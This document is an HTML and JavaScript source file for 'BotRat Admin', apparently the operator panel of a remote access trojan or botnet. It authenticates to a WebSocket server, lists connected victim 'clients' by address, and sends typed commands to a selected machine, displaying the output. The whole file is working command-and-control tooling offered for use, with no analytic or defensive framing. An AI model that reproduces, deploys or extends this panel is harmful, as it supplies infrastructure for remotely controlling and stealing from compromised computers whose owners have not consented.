<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>BotRat Admin</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#1a1a2e;color:#eee;font:14px/1.4 'SF Mono','Cascadia Code','Consolas',monospace;padding:16px;height:100vh;display:flex;flex-direction:column}
#top{display:flex;gap:12px;align-items:center;flex-wrap:wrap;padding-bottom:12px;border-bottom:1px solid #333}
#status{font-size:13px;padding:4px 12px;border-radius:4px;background:#333}
#status.ok{background:#1b5e20}
#status.err{background:#b71c1c}
#pw{background:#16213e;border:1px solid #333;color:#eee;padding:6px 10px;border-radius:4px;font:13px monospace;width:200px}
#pw:focus{outline:none;border-color:#0f3460}
#connect{background:#0f3460;color:#eee;border:none;padding:6px 16px;border-radius:4px;cursor:pointer}
#connect:hover{background:#1a4f8a}
#cl-bar{display:flex;gap:6px;align-items:center;flex-wrap:wrap;padding:8px 0;min-height:36px}
.cl-btn{background:#16213e;border:1px solid #333;color:#aaa;padding:4px 10px;border-radius:4px;cursor:pointer;font:12px monospace}
.cl-btn:hover{border-color:#0f3460;color:#eee}
.cl-btn.cur{background:#0f3460;border-color:#0f3460;color:#fff}
#term{flex:1;background:#0d0d1a;border:1px solid #222;border-radius:4px;padding:12px;overflow-y:auto;font:14px/1.5 'SF Mono','Cascadia Code','Consolas',monospace;white-space:pre-wrap;word-break:break-all;margin:8px 0}
#term .prompt{color:#0f0}
#term .out{color:#ccc}
#term .err{color:#f55}
#term .sys{color:#888;font-style:italic}
#input-line{display:flex;gap:8px;align-items:center;padding-top:8px;border-top:1px solid #333}
#prompt{color:#0f0}
#cmd{flex:1;background:#16213e;border:1px solid #333;color:#eee;padding:8px 10px;border-radius:4px;font:14px monospace}
#cmd:focus{outline:none;border-color:#0f3460}
#cmd:disabled{opacity:.4}
.hide{display:none!important}
</style>
</head>
<body>

<div id="top">
  <span id="status">Disconnected</span>
  <input id="pw" type="password" placeholder="Admin password">
  <button id="connect">Connect</button>
  <span style="color:#555;font-size:12px;margin-left:8px" id="url-label"></span>
</div>

<div id="cl-bar"><span style="color:#555;font-size:12px">Clients:</span></div>

<div id="term">Welcome to BotRat Admin.<br>Enter password and connect.<br></div>

<div id="input-line" class="hide">
  <span id="prompt">$</span>
  <input id="cmd" type="text" placeholder="type command..." disabled autofocus>
</div>

<script>
const TERM = document.getElementById('term');
const CMD = document.getElementById('cmd');
const PW = document.getElementById('pw');
const CONN = document.getElementById('connect');
const STATUS = document.getElementById('status');
const CL_BAR = document.getElementById('cl-bar');
const INPUT_LINE = document.getElementById('input-line');
const URL_LABEL = document.getElementById('url-label');

let ws = null;
let connected = false;
let clients = {};

function log(text, cls='out') {
  TERM.innerHTML += `<span class="${cls}">${escapeHtml(text)}\n</span>`;
  TERM.scrollTop = TERM.scrollHeight;
}

function escapeHtml(s) {
  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}

function setStatus(text, cls='') {
  STATUS.textContent = text;
  STATUS.className = cls;
}

function renderClients() {
  let html = '<span style="color:#555;font-size:12px">Clients:</span>';
  for (const [id, c] of Object.entries(clients)) {
    const cls = c.current ? 'cl-btn cur' : 'cl-btn';
    html += `<button class="${cls}" data-id="${id}">${id}:${c.addr}</button>`;
  }
  CL_BAR.innerHTML = html;
  CL_BAR.querySelectorAll('.cl-btn').forEach(btn => {
    btn.addEventListener('click', () => {
      if (ws) ws.send('select:' + btn.dataset.id);
    });
  });
}

CONN.addEventListener('click', toggleConnect);
CMD.addEventListener('keydown', (e) => {
  if (e.key === 'Enter' && CMD.value.trim()) {
    const cmd = CMD.value;
    log('$ ' + cmd, 'prompt');
    if (ws) ws.send(cmd);
    CMD.value = '';
  }
});

function toggleConnect() {
  if (connected) {
    if (ws) ws.close();
    return;
  }
  const pw = PW.value.trim();
  if (!pw) { log('Enter password', 'err'); return; }

  let url = prompt('Render URL (e.g. botrat.onrender.com):', '');
  if (!url) return;
  url = url.replace(/^https?:\/\//, '').replace(/\/.*$/, '');
  URL_LABEL.textContent = url;

  const wsUrl = 'wss://' + url + '/admin/ws';

  setStatus('Connecting...');
  log('Connecting to ' + wsUrl + ' ...', 'sys');

  try {
    ws = new WebSocket(wsUrl);
  } catch(e) {
    log('Connection error: ' + e.message, 'err');
    setStatus('Error', 'err');
    return;
  }

  ws.onopen = () => {
    log('Connected, authenticating...', 'sys');
    ws.send('auth:' + pw);
  };

  ws.onmessage = (e) => {
    const data = e.data;
    const colon = data.indexOf(':');

    if (data === 'auth_ok') {
      connected = true;
      setStatus('Connected', 'ok');
      CONN.textContent = 'Disconnect';
      INPUT_LINE.classList.remove('hide');
      CMD.disabled = false;
      CMD.focus();
      PW.disabled = true;
      log('Authenticated', 'sys');
      ws.send('clients');
      return;
    }

    if (data === 'auth_err') {
      log('Auth failed: wrong password', 'err');
      setStatus('Auth failed', 'err');
      ws.close();
      return;
    }

    if (data.startsWith('clients:')) {
      try {
        clients = {};
        const arr = JSON.parse(data.slice(8));
        arr.forEach(c => { clients[c.id] = c; });
        renderClients();
      } catch(e) {}
      return;
    }

    if (data.startsWith('selected:')) {
      const id = data.slice(9);
      Object.values(clients).forEach(c => c.current = (c.id == id));
      renderClients();
      log('Selected client ' + id, 'sys');
      return;
    }

    if (data.startsWith('output:')) {
      log(data.slice(7));
      return;
    }

    if (data.startsWith('error:')) {
      log(data.slice(6), 'err');
      return;
    }

    log(data);
  };

  ws.onclose = () => {
    connected = false;
    setStatus('Disconnected', 'err');
    CONN.textContent = 'Connect';
    INPUT_LINE.classList.add('hide');
    CMD.disabled = true;
    PW.disabled = false;
    ws = null;
    log('Disconnected', 'sys');
  };

  ws.onerror = (e) => {
    log('WebSocket error', 'err');
  };
}
</script>
</body>
</html>
